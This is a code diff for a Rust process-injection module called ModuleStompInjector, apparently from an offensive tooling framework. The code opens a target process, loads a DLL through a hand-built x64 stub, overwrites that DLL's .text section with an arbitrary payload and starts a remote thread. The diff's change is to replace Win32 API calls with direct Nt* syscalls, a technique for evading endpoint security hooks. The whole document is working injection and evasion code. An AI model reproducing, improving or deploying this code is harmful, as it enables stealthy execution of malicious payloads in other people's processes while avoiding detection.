@@ -7,10 +7,6 @@ pub struct ModuleStompInjector;
 impl Injector for ModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use std::mem::size_of;
-        use winapi::um::memoryapi::{
-            ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
-        };
-        use winapi::um::processthreadsapi::OpenProcess;
         use winapi::um::winnt::{
             IMAGE_DOS_HEADER, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
         };
@@ -39,18 +35,124 @@ impl Injector for ModuleStompInjector {
             "ModuleStompInjector: shellcode stub requires x86_64; unsupported architecture"
         ));
 
+        // Open target process via NtOpenProcess
+        let mut client_id = [0u64; 2];
+        client_id[0] = pid as u64;
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
         unsafe {
-            let h_proc = OpenProcess(
-                PROCESS_VM_OPERATION
-                    | PROCESS_VM_WRITE
-                    | PROCESS_VM_READ
-                    | PROCESS_CREATE_THREAD
-                    | PROCESS_QUERY_INFORMATION,
-                0,
-                pid,
+            let mut h_proc_val: usize = 0;
+            let access_mask = (PROCESS_VM_OPERATION
+                | PROCESS_VM_WRITE
+                | PROCESS_VM_READ
+                | PROCESS_CREATE_THREAD
+                | PROCESS_QUERY_INFORMATION) as u64;
+            let open_status = nt_syscall::syscall!(
+                "NtOpenProcess",
+                &mut h_proc_val as *mut _ as u64,
+                access_mask,
+                &mut obj_attr as *mut _ as u64,
+                client_id.as_mut_ptr() as u64,
             );
-            if h_proc.is_null() {
-                return Err(anyhow!("Failed to open process"));
+            match open_status {
+                Ok(s) if s >= 0 && h_proc_val != 0 => {}
+                _ => return Err(anyhow!("ModuleStomp: NtOpenProcess failed")),
+            }
+            let h_proc = h_proc_val as *mut winapi::ctypes::c_void;
+
+            macro_rules! close_h {
+                () => { nt_syscall::syscall!("NtClose", h_proc as u64).ok(); };
+            }
+            macro_rules! cleanup_and_err {
+                ($msg:expr) => {{ close_h!(); return Err(anyhow!($msg)); }};
+                ($fmt:expr, $($arg:tt)*) => {{ close_h!(); return Err(anyhow!($fmt, $($arg)*)); }};
+            }
+
+            // Helper: NtReadVirtualMemory — returns bytes read on success.
+            macro_rules! nt_read {
+                ($base:expr, $buf:expr) => {{
+                    let mut _br: usize = 0;
+                    let _s = nt_syscall::syscall!(
+                        "NtReadVirtualMemory",
+                        h_proc as u64, $base as u64,
+                        $buf as *mut _ as u64, std::mem::size_of_val($buf) as u64,
+                        &mut _br as *mut _ as u64,
+                    );
+                    (_s.unwrap_or(-1), _br)
+                }};
+                ($base:expr, $buf:expr, $len:expr) => {{
+                    let mut _br: usize = 0;
+                    let _s = nt_syscall::syscall!(
+                        "NtReadVirtualMemory",
+                        h_proc as u64, $base as u64,
+                        $buf as *mut _ as u64, $len as u64,
+                        &mut _br as *mut _ as u64,
+                    );
+                    (_s.unwrap_or(-1), _br)
+                }};
+            }
+
+            // Helper: NtWriteVirtualMemory — returns bytes written on success.
+            macro_rules! nt_write {
+                ($base:expr, $buf:expr, $len:expr) => {{
+                    let mut _bw: usize = 0;
+                    let _s = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        h_proc as u64, $base as u64,
+                        $buf as *const _ as u64, $len as u64,
+                        &mut _bw as *mut _ as u64,
+                    );
+                    (_s.unwrap_or(-1), _bw)
+                }};
+            }
+
+            // Helper: NtAllocateVirtualMemory — returns pointer or null.
+            macro_rules! nt_alloc {
+                ($size:expr, $prot:expr) => {{
+                    let mut _base: *mut std::ffi::c_void = std::ptr::null_mut();
+                    let mut _sz: usize = $size;
+                    let _s = nt_syscall::syscall!(
+                        "NtAllocateVirtualMemory",
+                        h_proc as u64, &mut _base as *mut _ as u64,
+                        0u64, &mut _sz as *mut _ as u64,
+                        (MEM_COMMIT | MEM_RESERVE) as u64, $prot as u64,
+                    );
+                    if _s.unwrap_or(-1) < 0 || _base.is_null() {
+                        std::ptr::null_mut()
+                    } else {
+                        _base
+                    }
+                }};
+            }
+
+            // Helper: NtFreeVirtualMemory (MEM_RELEASE).
+            macro_rules! nt_free {
+                ($base:expr) => {{
+                    let mut _fb = $base as usize;
+                    let mut _fs: usize = 0;
+                    nt_syscall::syscall!(
+                        "NtFreeVirtualMemory",
+                        h_proc as u64, &mut _fb as *mut _ as u64,
+                        &mut _fs as *mut _ as u64, 0x8000u64,
+                    ).ok();
+                }};
+            }
+
+            // Helper: NtProtectVirtualMemory.
+            macro_rules! nt_protect {
+                ($base:expr, $size:expr, $new_prot:expr) => {{
+                    let mut _pb = $base as usize;
+                    let mut _ps = $size;
+                    let mut _old: u32 = 0;
+                    let _s = nt_syscall::syscall!(
+                        "NtProtectVirtualMemory",
+                        h_proc as u64, &mut _pb as *mut _ as u64,
+                        &mut _ps as *mut _ as u64,
+                        $new_prot as u64, &mut _old as *mut _ as u64,
+                    );
+                    _s.unwrap_or(-1)
+                }};
             }
 
             // ── Resolve ntdll, LdrLoadDll, NtCreateThreadEx, NtQueryInformationProcess ──
@@ -99,36 +201,21 @@ impl Injector for ModuleStompInjector {
             ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
             let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;
             if peb_addr == 0 {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("Failed to get target PEB address"));
+                cleanup_and_err!("Failed to get target PEB address");
             }
 
             // ── Walk TARGET process PEB to find a suitable already-loaded DLL ──
             // H-19 fix: previously this walked the LOCAL process PEB via gs:[0x30]
             // which had no relationship to the modules loaded in the remote target.
             let mut ldr_ptr = 0usize;
-            let mut bytes_read = 0usize;
-            ReadProcessMemory(
-                h_proc,
-                (peb_addr + 0x18) as _,
-                &mut ldr_ptr as *mut _ as _,
-                8,
-                &mut bytes_read,
-            );
+            let (s, _) = nt_read!((peb_addr + 0x18) as u64, &mut ldr_ptr);
             if ldr_ptr == 0 {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("Failed to read target Ldr pointer"));
+                cleanup_and_err!("Failed to read target Ldr pointer");
             }
 
             let list_head = ldr_ptr + 0x10; // InLoadOrderModuleList
             let mut flink = 0usize;
-            ReadProcessMemory(
-                h_proc,
-                list_head as _,
-                &mut flink as *mut _ as _,
-                8,
-                &mut bytes_read,
-            );
+            nt_read!(list_head as u64, &mut flink);
 
             let mut target_dll_name: Option<String> = None;
             let mut target_base: usize = 0;
@@ -136,14 +223,8 @@ impl Injector for ModuleStompInjector {
 
             while current != list_head && current != 0 {
                 let mut entry = [0u8; 0x70];
-                if ReadProcessMemory(
-                    h_proc,
-                    current as _,
-                    entry.as_mut_ptr() as _,
-                    entry.len(),
-                    &mut bytes_read,
-                ) == 0
-                {
+                let (s, _) = nt_read!(current as u64, entry.as_mut_ptr(), entry.len());
+                if s < 0 {
                     break;
                 }
                 let dll_base = u64::from_le_bytes(entry[0x30..0x38].try_into().unwrap()) as usize;
@@ -152,13 +233,7 @@ impl Injector for ModuleStompInjector {
 
                 if dll_base != 0 && name_len > 0 && name_buf != 0 {
                     let mut name_wide = vec![0u16; name_len / 2];
-                    ReadProcessMemory(
-                        h_proc,
-                        name_buf as _,
-                        name_wide.as_mut_ptr() as _,
-                        name_len,
-                        &mut bytes_read,
-                    );
+                    nt_read!(name_buf as u64, name_wide.as_mut_ptr() as *mut u8, name_len);
                     let name_str = String::from_utf16_lossy(&name_wide);
                     let lname = name_str.to_ascii_lowercase();
 
@@ -178,35 +253,20 @@ impl Injector for ModuleStompInjector {
                     if !is_excluded {
                         // Read PE headers from TARGET process to check .text size.
                         let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
-                        ReadProcessMemory(
-                            h_proc,
-                            dll_base as _,
-                            &mut dos_header as *mut _ as _,
-                            size_of::<IMAGE_DOS_HEADER>(),
-                            &mut bytes_read,
-                        );
+                        nt_read!(dll_base as u64, &mut dos_header);
                         if dos_header.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                             let nt_addr = dll_base + dos_header.e_lfanew as usize;
                             let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
-                            ReadProcessMemory(
-                                h_proc,
-                                nt_addr as _,
-                                &mut nt_headers as *mut _ as _,
-                                size_of::<IMAGE_NT_HEADERS64>(),
-                                &mut bytes_read,
-                            );
+                            nt_read!(nt_addr as u64, &mut nt_headers);
                             let ns = nt_headers.FileHeader.NumberOfSections as usize;
                             let sec_base = nt_addr
                                 + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
                                 + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
                             for i in 0..ns {
                                 let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
-                                ReadProcessMemory(
-                                    h_proc,
-                                    (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as _,
-                                    &mut sec as *mut _ as _,
-                                    size_of::<IMAGE_SECTION_HEADER>(),
-                                    &mut bytes_read,
+                                nt_read!(
+                                    (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as u64,
+                                    &mut sec
                                 );
                                 if &sec.Name[..5] == b".text" {
                                     if *sec.Misc.VirtualSize() as usize >= payload.len() {
@@ -258,32 +318,14 @@ impl Injector for ModuleStompInjector {
                     let base_addr_offset = us_offset + 16;
                     let total_remote = base_addr_offset + 8;
 
-                    let remote_buf = VirtualAllocEx(
-                        h_proc,
-                        std::ptr::null_mut(),
-                        total_remote,
-                        MEM_COMMIT | MEM_RESERVE,
-                        PAGE_READWRITE,
-                    );
+                    let remote_buf = nt_alloc!(total_remote, PAGE_READWRITE);
                     if remote_buf.is_null() {
                         continue;
                     }
 
-                    let mut written = 0usize;
-                    if WriteProcessMemory(
-                        h_proc,
-                        remote_buf,
-                        wide.as_ptr() as _,
-                        wide_bytes,
-                        &mut written,
-                    ) == 0
-                    {
-                        winapi::um::memoryapi::VirtualFreeEx(
-                            h_proc,
-                            remote_buf,
-                            0,
-                            winapi::um::winnt::MEM_RELEASE,
-                        );
+                    let (s, _) = nt_write!(remote_buf, wide.as_ptr() as *const u16, wide_bytes);
+                    if s < 0 {
+                        nt_free!(remote_buf);
                         continue;
                     }
 
@@ -296,38 +338,16 @@ impl Injector for ModuleStompInjector {
                     us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes());
                     us_bytes[8..16]
                         .copy_from_slice(&(remote_str_va as u64).to_le_bytes());
-                    if WriteProcessMemory(
-                        h_proc,
-                        remote_us_ptr,
-                        us_bytes.as_ptr() as _,
-                        16,
-                        &mut written,
-                    ) == 0
-                    {
-                        winapi::um::memoryapi::VirtualFreeEx(
-                            h_proc,
-                            remote_buf,
-                            0,
-                            winapi::um::winnt::MEM_RELEASE,
-                        );
+                    let (s, _) = nt_write!(remote_us_ptr, us_bytes.as_ptr(), 16);
+                    if s < 0 {
+                        nt_free!(remote_buf);
                         continue;
                     }
 
                     // Build x64 stub for LdrLoadDll
-                    let stub_region = VirtualAllocEx(
-                        h_proc,
-                        std::ptr::null_mut(),
-                        256,
-                        MEM_COMMIT | MEM_RESERVE,
-                        PAGE_READWRITE,
-                    );
+                    let stub_region = nt_alloc!(256, PAGE_READWRITE);
                     if stub_region.is_null() {
-                        winapi::um::memoryapi::VirtualFreeEx(
-                            h_proc,
-                            remote_buf,
-                            0,
-                            winapi::um::winnt::MEM_RELEASE,
-                        );
+                        nt_free!(remote_buf);
                         continue;
                     }
 
@@ -350,37 +370,14 @@ impl Injector for ModuleStompInjector {
                     stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
                     stub.push(0xC3); // ret
 
-                    if WriteProcessMemory(
-                        h_proc,
-                        stub_region,
-                        stub.as_ptr() as _,
-                        stub.len(),
-                        &mut written,
-                    ) == 0
-                    {
-                        winapi::um::memoryapi::VirtualFreeEx(
-                            h_proc,
-                            stub_region,
-                            0,
-                            winapi::um::winnt::MEM_RELEASE,
-                        );
-                        winapi::um::memoryapi::VirtualFreeEx(
-                            h_proc,
-                            remote_buf,
-                            0,
-                            winapi::um::winnt::MEM_RELEASE,
-                        );
+                    let (s, _) = nt_write!(stub_region, stub.as_ptr(), stub.len());
+                    if s < 0 {
+                        nt_free!(stub_region);
+                        nt_free!(remote_buf);
                         continue;
                     }
 
-                    let mut _old_prot = 0u32;
-                    winapi::um::memoryapi::VirtualProtectEx(
-                        h_proc,
-                        stub_region,
-                        stub.len(),
-                        winapi::um::winnt::PAGE_EXECUTE_READ,
-                        &mut _old_prot,
-                    );
+                    nt_protect!(stub_region, stub.len(), PAGE_EXECUTE_READ);
 
                     let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
                     let status = build_thread(
@@ -401,41 +398,19 @@ impl Injector for ModuleStompInjector {
                             h_thread,
                             winapi::um::winbase::INFINITE,
                         );
-                        pe_resolve::close_handle(h_thread);
+                        nt_syscall::syscall!("NtClose", h_thread as u64).ok();
                     }
-                    winapi::um::memoryapi::VirtualFreeEx(
-                        h_proc,
-                        stub_region,
-                        0,
-                        winapi::um::winnt::MEM_RELEASE,
-                    );
-                    winapi::um::memoryapi::VirtualFreeEx(
-                        h_proc,
-                        remote_buf,
-                        0,
-                        winapi::um::winnt::MEM_RELEASE,
-                    );
+                    nt_free!(stub_region);
+                    nt_free!(remote_buf);
 
                     // Re-walk target PEB to find the newly loaded DLL.
                     let mut flink2 = 0usize;
-                    ReadProcessMemory(
-                        h_proc,
-                        list_head as _,
-                        &mut flink2 as *mut _ as _,
-                        8,
-                        &mut bytes_read,
-                    );
+                    nt_read!(list_head as u64, &mut flink2);
                     let mut cur2 = flink2;
                     while cur2 != list_head && cur2 != 0 {
                         let mut ent = [0u8; 0x70];
-                        if ReadProcessMemory(
-                            h_proc,
-                            cur2 as _,
-                            ent.as_mut_ptr() as _,
-                            ent.len(),
-                            &mut bytes_read,
-                        ) == 0
-                        {
+                        let (s, _) = nt_read!(cur2 as u64, ent.as_mut_ptr(), ent.len());
+                        if s < 0 {
                             break;
                         }
                         let db =
@@ -446,13 +421,7 @@ impl Injector for ModuleStompInjector {
                             u64::from_le_bytes(ent[0x50..0x58].try_into().unwrap()) as usize;
                         if db != 0 && nl > 0 && nb != 0 {
                             let mut nw = vec![0u16; nl / 2];
-                            ReadProcessMemory(
-                                h_proc,
-                                nb as _,
-                                nw.as_mut_ptr() as _,
-                                nl,
-                                &mut bytes_read,
-                            );
+                            nt_read!(nb as u64, nw.as_mut_ptr() as *mut u8, nl);
                             let module_name = String::from_utf16_lossy(&nw);
                             if module_name
                                 .trim_end_matches('\0')
@@ -462,25 +431,14 @@ impl Injector for ModuleStompInjector {
                                 // its PE headers from the remote process and
                                 // verifying that .text can accommodate payload.
                                 let mut cand_dos: IMAGE_DOS_HEADER = std::mem::zeroed();
-                                if ReadProcessMemory(
-                                    h_proc,
-                                    db as _,
-                                    &mut cand_dos as *mut _ as _,
-                                    size_of::<IMAGE_DOS_HEADER>(),
-                                    &mut bytes_read,
-                                ) != 0
+                                let (s, _) = nt_read!(db as u64, &mut cand_dos);
+                                if s >= 0
                                     && cand_dos.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE
                                 {
                                     let cand_nt_addr = db + cand_dos.e_lfanew as usize;
                                     let mut cand_nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
-                                    if ReadProcessMemory(
-                                        h_proc,
-                                        cand_nt_addr as _,
-                                        &mut cand_nt as *mut _ as _,
-                                        size_of::<IMAGE_NT_HEADERS64>(),
-                                        &mut bytes_read,
-                                    ) != 0
-                                    {
+                                    let (s, _) = nt_read!(cand_nt_addr as u64, &mut cand_nt);
+                                    if s >= 0 {
                                         let cand_ns = cand_nt.FileHeader.NumberOfSections as usize;
                                         let cand_sec_base = cand_nt_addr
                                             + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
@@ -489,15 +447,11 @@ impl Injector for ModuleStompInjector {
 
                                         for si in 0..cand_ns {
                                             let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
-                                            if ReadProcessMemory(
-                                                h_proc,
-                                                (cand_sec_base + si * size_of::<IMAGE_SECTION_HEADER>())
-                                                    as _,
-                                                &mut sec as *mut _ as _,
-                                                size_of::<IMAGE_SECTION_HEADER>(),
-                                                &mut bytes_read,
-                                            ) == 0
-                                            {
+                                            let (s, _) = nt_read!(
+                                                (cand_sec_base + si * size_of::<IMAGE_SECTION_HEADER>()) as u64,
+                                                &mut sec
+                                            );
+                                            if s < 0 {
                                                 break;
                                             }
                                             if &sec.Name[..5] == b".text" {
@@ -535,11 +489,10 @@ impl Injector for ModuleStompInjector {
                 }
 
                 if target_base == 0 {
-                    pe_resolve::close_handle(h_proc);
-                    return Err(anyhow!(
+                    cleanup_and_err!(
                         "ModuleStompInjector: no loaded module with a .text section large enough to accommodate the payload ({} bytes)",
                         payload.len()
-                    ));
+                    );
                 }
             }
 
@@ -547,16 +500,9 @@ impl Injector for ModuleStompInjector {
 
             // ── Find .text section of target DLL ─────────────────────────────
             let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
-            ReadProcessMemory(
-                h_proc,
-                target_base as _,
-                &mut dos_header as *mut _ as _,
-                size_of::<IMAGE_DOS_HEADER>(),
-                &mut bytes_read,
-            );
+            nt_read!(target_base as u64, &mut dos_header);
             if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("Invalid DOS signature on target DLL"));
+                cleanup_and_err!("Invalid DOS signature on target DLL");
             }
 
             #[cfg(target_arch = "x86_64")]
@@ -566,13 +512,7 @@ impl Injector for ModuleStompInjector {
 
             let mut nt_headers: NtHeaders = std::mem::zeroed();
             let nt_addr = target_base + dos_header.e_lfanew as usize;
-            ReadProcessMemory(
-                h_proc,
-                nt_addr as _,
-                &mut nt_headers as *mut _ as _,
-                size_of::<NtHeaders>(),
-                &mut bytes_read,
-            );
+            nt_read!(nt_addr as u64, &mut nt_headers);
 
             let section_base = nt_addr
                 + std::mem::offset_of!(NtHeaders, OptionalHeader)
@@ -582,12 +522,9 @@ impl Injector for ModuleStompInjector {
 
             for i in 0..nt_headers.FileHeader.NumberOfSections as usize {
                 let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
-                ReadProcessMemory(
-                    h_proc,
-                    (section_base + i * size_of::<IMAGE_SECTION_HEADER>()) as _,
-                    &mut sec as *mut _ as _,
-                    size_of::<IMAGE_SECTION_HEADER>(),
-                    &mut bytes_read,
+                nt_read!(
+                    (section_base + i * size_of::<IMAGE_SECTION_HEADER>()) as u64,
+                    &mut sec
                 );
                 if &sec.Name[..5] == b".text" {
                     text_rva = sec.VirtualAddress;
@@ -597,44 +534,22 @@ impl Injector for ModuleStompInjector {
             }
 
             if text_rva == 0 {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("Failed to find .text section of target DLL"));
+                cleanup_and_err!("Failed to find .text section of target DLL");
             }
             if payload.len() > text_size as usize {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("Payload larger than target .text section"));
+                cleanup_and_err!("Payload larger than target .text section");
             }
 
             // ── Stomp .text section and execute ────────────────────────────
             let target_addr = (target_base + text_rva as usize) as *mut winapi::ctypes::c_void;
-            let mut old_protect = 0u32;
-            let mut written = 0usize;
-            VirtualProtectEx(
-                h_proc,
-                target_addr,
-                payload.len(),
-                PAGE_READWRITE,
-                &mut old_protect,
-            );
-            WriteProcessMemory(
-                h_proc,
-                target_addr,
-                payload.as_ptr() as _,
-                payload.len(),
-                &mut written,
-            );
-            VirtualProtectEx(
-                h_proc,
-                target_addr,
-                payload.len(),
-                PAGE_EXECUTE_READ,
-                &mut old_protect,
-            );
-            winapi::um::processthreadsapi::FlushInstructionCache(
-                h_proc,
-                target_addr,
-                payload.len(),
-            );
+            nt_protect!(target_addr, payload.len(), PAGE_READWRITE);
+            let mut _written = 0usize;
+            nt_write!(target_addr, payload.as_ptr(), payload.len());
+            nt_protect!(target_addr, payload.len(), PAGE_EXECUTE_READ);
+            nt_syscall::syscall!(
+                "NtFlushInstructionCache",
+                h_proc as u64, target_addr as u64, payload.len() as u64,
+            ).ok();
 
             let mut h_exec_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
             let exec_status = build_thread(
@@ -651,16 +566,15 @@ impl Injector for ModuleStompInjector {
                 std::ptr::null_mut(),
             );
             if exec_status >= 0 && !h_exec_thread.is_null() {
-                pe_resolve::close_handle(h_exec_thread);
+                nt_syscall::syscall!("NtClose", h_exec_thread as u64).ok();
             } else {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!(
+                cleanup_and_err!(
                     "NtCreateThreadEx execution failed: {:x}",
                     exec_status
-                ));
+                );
             }
 
-            pe_resolve::close_handle(h_proc);
+            close_h!();
         }
         Ok(())
     }
